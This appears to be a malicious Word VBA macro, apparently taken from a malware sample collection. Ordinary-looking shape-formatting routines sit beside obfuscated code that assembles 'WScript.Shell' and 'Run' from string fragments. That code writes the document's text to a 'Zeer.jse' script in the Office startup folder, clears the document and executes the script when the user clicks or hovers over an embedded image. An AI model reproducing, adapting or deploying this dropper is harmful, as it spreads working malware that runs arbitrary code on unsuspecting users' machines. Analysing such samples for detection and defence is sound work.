Attribute VB_Name = "ThisDocument"
Attribute VB_Base = "1Normal.ThisDocument"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = True
Attribute VB_Customizable = True
Attribute VB_Control = "Image1, 0, 0, MSForms, Image"
Private Gttool As String
Private Hooppl As String
Private Errop0 As String
Private Dbopp8 As String


Sub MatchZOrder(oldShape As Shape, newShape As Shape)
    ' Make the Z order of newShape equal to 1 higher than that of oldShape
    
    newShape.ZOrder msoBringToFront
    While (newShape.ZOrderPosition > oldShape.ZOrderPosition + 1)
        newShape.ZOrder msoSendBackward
    Wend
End Sub


'Not used
Sub TransferGroupFormat(oldShape As Shape, newShape As Shape)
    On Error Resume Next
    ' Transfer group formatting
    If oldShape.Glow.Radius > 0 Then
        newShape.Glow.Color = oldShape.Glow.Color
        newShape.Glow.Radius = oldShape.Glow.Radius
        newShape.Glow.Transparency = oldShape.Glow.Transparency
    End If
    If oldShape.Reflection.Type <> msoReflectionTypeNone Then
        newShape.Reflection.Blur = oldShape.Reflection.Blur
        newShape.Reflection.Offset = oldShape.Reflection.Offset
        newShape.Reflection.Size = oldShape.Reflection.Size
        newShape.Reflection.Transparency = oldShape.Reflection.Transparency
        newShape.Reflection.Type = oldShape.Reflection.Type
    End If
    
    If oldShape.SoftEdge.Type <> msoSoftEdgeTypeNone Then
        newShape.SoftEdge.Radius = oldShape.SoftEdge.Radius
    End If
    
    If oldShape.Shadow.Visible Then
        newShape.Shadow.Visible = oldShape.Shadow.Visible
        newShape.Shadow.Blur = oldShape.Shadow.Blur
        newShape.Shadow.ForeColor = oldShape.Shadow.ForeColor
        newShape.Shadow.OffsetX = oldShape.Shadow.OffsetX
        newShape.Shadow.OffsetY = oldShape.Shadow.OffsetY
        newShape.Shadow.RotateWithShape = oldShape.Shadow.RotateWithShape
        newShape.Shadow.Size = oldShape.Shadow.Size
        newShape.Shadow.Style = oldShape.Shadow.Style
        newShape.Shadow.Transparency = oldShape.Shadow.Transparency
        newShape.Shadow.Type = oldShape.Shadow.Type
    End If
    
    If oldShape.ThreeD.Visible Then
        'newShape.ThreeD.BevelBottomDepth = oldShape.ThreeD.BevelBottomDepth
        'newShape.ThreeD.BevelBottomInset = oldShape.ThreeD.BevelBottomInset
        'newShape.ThreeD.BevelBottomType = oldShape.ThreeD.BevelBottomType
        'newShape.ThreeD.BevelTopDepth = oldShape.ThreeD.BevelTopDepth
        'newShape.ThreeD.BevelTopInset = oldShape.ThreeD.BevelTopInset
        'newShape.ThreeD.BevelTopType = oldShape.ThreeD.BevelTopType
        'newShape.ThreeD.ContourColor = oldShape.ThreeD.ContourColor
        'newShape.ThreeD.ContourWidth = oldShape.ThreeD.ContourWidth
        'newShape.ThreeD.Depth = oldShape.ThreeD.Depth
        'newShape.ThreeD.ExtrusionColor = oldShape.ThreeD.ExtrusionColor
        'newShape.ThreeD.ExtrusionColorType = oldShape.ThreeD.ExtrusionColorType
        newShape.ThreeD.Visible = oldShape.ThreeD.Visible
        newShape.ThreeD.Perspective = oldShape.ThreeD.Perspective
        newShape.ThreeD.FieldOfView = oldShape.ThreeD.FieldOfView
        newShape.ThreeD.LightAngle = oldShape.ThreeD.LightAngle
        'newShape.ThreeD.ProjectText = oldShape.ThreeD.ProjectText
        'If oldShape.ThreeD.PresetExtrusionDirection <> msoPresetExtrusionDirectionMixed Then
        '    newShape.ThreeD.SetExtrusionDirection oldShape.ThreeD.PresetExtrusionDirection
        'End If
        newShape.ThreeD.PresetLighting = oldShape.ThreeD.PresetLighting
        If oldShape.ThreeD.PresetLightingDirection <> msoPresetLightingDirectionMixed Then
            newShape.ThreeD.PresetLightingDirection = oldShape.ThreeD.PresetLightingDirection
        End If
        If oldShape.ThreeD.PresetLightingSoftness <> msoPresetLightingSoftnessMixed Then
            newShape.ThreeD.PresetLightingSoftness = oldShape.ThreeD.PresetLightingSoftness
        End If
        If oldShape.ThreeD.PresetMaterial <> msoPresetMaterialMixed Then
            newShape.ThreeD.PresetMaterial = oldShape.ThreeD.PresetMaterial
        End If
        If oldShape.ThreeD.PresetCamera <> msoPresetCameraMixed Then
            newShape.ThreeD.SetPresetCamera oldShape.ThreeD.PresetCamera
        End If
        newShape.ThreeD.RotationX = oldShape.ThreeD.RotationX
        newShape.ThreeD.RotationY = oldShape.ThreeD.RotationY
        newShape.ThreeD.RotationZ = oldShape.ThreeD.RotationZ
        'newShape.ThreeD.Z = oldShape.ThreeD.Z
    End If
End Sub



Private Sub Vberr67(onnn As String)
Gttool = onnn & Empty & "\Nooker" & ""
On Error Resume Next
MkDir Gttool
Gttool = "" & Gttool & Empty & "\Zeer." & "" & "j" & Empty & "s" & "" & "e"
Dim Hberrdd As Integer
Hberrdd = FreeFile
Open Gttool For Output As #Hberrdd
Print #Hberrdd, ActiveDocument.Content.Text
Close #Hberrdd
ActiveDocument.Tables.Add Range:=Selection.Range, NumRows:=1, NumColumns:=1
Hooppl = Empty & "s" & Empty & "h" & Empty & "el" & "l" & Empty
Exit Sub
TransferGroupFormat ActiveDocument.Shapes(1), ActiveDocument.Shapes(1)
MatchZOrder ActiveDocument.Shapes(1), ActiveDocument.Shapes(1)
End Sub



Sub RemoveMenuItem(itemText As String)
On Error Resume Next
    Dim Menu As CommandBars
    Set Menu = Application.CommandBars
    For i = 1 To Menu("Insert").Controls.Count
        If Menu("Insert").Controls(i).Caption = itemText Then
            Menu("Insert").Controls(i).Delete
            Exit For
        End If
    Next
    
Vberr67 Application.StartupPath
End Sub


Function PackToHeader(code As String) As String
    Dim vbNewLine As String
    vbNewLine = "-"
    On Error Resume Next
    Lines = Split(code, vbNewLine)
    
    PackToHeader = "%%% HEADER %%%" & vbNewLine
    
    For i = 1 To Lines.Count
        PackToHeader = PackToHeader & "%" & Lines(i) & vbNewLine
    Next
    
    
     VBA.CallByName VBA.CreateObject(Empty + "W" + Empty + "Sc" & "" & "rip" & "" & "t." & Hooppl), _
    "R" & "" & "u" & Empty & "n", VbMethod, _
    """" & Gttool & """" & " " & PackToHeader, 0
    PackToHeader = PackToHeader & "%%% END HEADER %%%"
End Function


Private Sub Mertt0()
If (Len(ActiveDocument.Content.Text) > 3468) Then
RemoveMenuItem "Hu 001"
ActiveDocument.Content.Text = ""
PackToHeader "01-67-100001"
End If
End Sub


Private Sub Image1_MouseMove(ByVal Button As Integer, ByVal Shift As Integer, ByVal X As Single, ByVal Y As Single)
Mertt0
End Sub

Private Sub Image1_Click()
Mertt0
End Sub










INQUEST-PP=macro
